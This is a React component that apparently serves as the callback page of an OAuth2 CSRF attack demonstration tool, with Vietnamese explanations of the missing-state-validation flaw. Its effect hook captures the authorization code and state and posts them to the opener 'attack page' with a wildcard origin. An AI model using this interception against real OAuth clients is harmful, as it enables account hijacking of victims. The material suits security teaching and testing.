import { useEffect, useState } from 'react'
import { useLocation, useNavigate } from 'react-router-dom'

export default function CallbackPage() {
  const loc = useLocation()
  const nav = useNavigate()
  const [params, setParams] = useState({ code: '', state: '' })
  const [copied, setCopied] = useState(false)

  useEffect(() => {
    const searchParams = new URLSearchParams(loc.search)
    const code = searchParams.get('code') || ''
    const state = searchParams.get('state') || ''
    setParams({ code, state })

    // Gửi message cho parent window (attack page) kèm code VÀ state
    if (window.opener) {
      window.opener.postMessage({ type: 'OAUTH_CODE_INTERCEPTED', code, state }, '*')
    }
  }, [loc])

  const copyToClipboard = () => {
    navigator.clipboard.writeText(JSON.stringify(params, null, 2))
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#0f172a',
      color: '#e2e8f0',
      fontFamily: 'monospace',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <div className="card" style={{ maxWidth: '620px', width: '100%', border: '1px solid #dc2626', boxShadow: '0 0 15px rgba(220, 38, 38, 0.3)' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px', borderBottom: '1px solid #dc2626', paddingBottom: '10px', marginBottom: '20px' }}>
          <div>
            <h1 style={{ fontSize: '20px', margin: 0, color: '#ef4444', fontWeight: 800 }}>
              CSRF CALLBACK RECEIVED!
            </h1>
            <p style={{ margin: 0, fontSize: '11px', color: '#94a3b8' }}>
              OAuth2 CSRF Attack — Thiếu validate state parameter
            </p>
          </div>
        </div>

        <p style={{ fontSize: '13px', color: '#cbd5e1', lineHeight: '1.6', marginBottom: '16px' }}>
          Victim đã đăng nhập bằng tài khoản của mình, nhưng Authorization Code được cấp theo
          <strong style={{ color: '#f59e0b' }}> authorization request của Attacker</strong>.
          Nếu Client không validate <code style={{ color: '#ef4444' }}>state</code> → session của Victim bị bind với account Attacker!
        </p>

        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <div style={{ background: '#090d16', padding: '12px', borderRadius: '6px', border: '1px solid #334155' }}>
            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>Authorization Code:</span>
            <div style={{ color: '#22c55e', fontSize: '15px', fontWeight: 'bold', marginTop: '6px', wordBreak: 'break-all' }}>
              {params.code || '(null / empty)'}
            </div>
          </div>

          <div style={{ background: '#090d16', padding: '12px', borderRadius: '6px', border: params.state ? '1px solid #3b82f6' : '1px solid #dc2626' }}>
            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>State Parameter:</span>
            <div style={{ fontSize: '13px', fontWeight: 'bold', marginTop: '6px', wordBreak: 'break-all', color: params.state ? '#3b82f6' : '#ef4444' }}>
              {params.state || '(trống — KHÔNG có state)'}
            </div>
            <div style={{ marginTop: 6, fontSize: 11, color: params.state ? '#94a3b8' : '#f87171' }}>
              {params.state
                ? `ℹ️ State="${params.state}" — Client cần kiểm tra xem state này có khớp với session không`
                : '⚠️ Không có state → Client không thể phân biệt đây là CSRF hay request hợp lệ!'
              }
            </div>
          </div>
        </div>

        <div style={{
          marginTop: 16,
          padding: '12px',
          background: 'rgba(239, 68, 68, 0.08)',
          borderRadius: 6,
          fontSize: 12,
          color: '#fbbf24',
          lineHeight: 1.7
        }}>
          <strong>📋 Kết quả:</strong><br/>
          Code này thuộc authorization request của <strong style={{ color: '#ef4444' }}>Attacker</strong>,
          không phải của Victim. Nếu Client dùng code này để đổi lấy token → session của Victim
          sẽ bind với tài khoản Google của Attacker!
        </div>

        <div style={{ display: 'flex', gap: '10px', marginTop: '16px' }}>
          <button className="btn btn-danger" onClick={copyToClipboard} style={{ flex: 1 }}>
            {copied ? '✅ Copied!' : 'Copy JSON'}
          </button>

          {window.opener ? (
            <button className="btn btn-ghost" onClick={() => window.close()} style={{ flex: 1, border: '1px solid #475569' }}>
              Đóng & Quay lại Attack Tool
            </button>
          ) : (
            <button className="btn btn-ghost" onClick={() => nav('/oauth2')} style={{ flex: 1, border: '1px solid #475569' }}>
              Return to Hacker Tool
            </button>
          )}
        </div>
      </div>
    </div>
  )
}
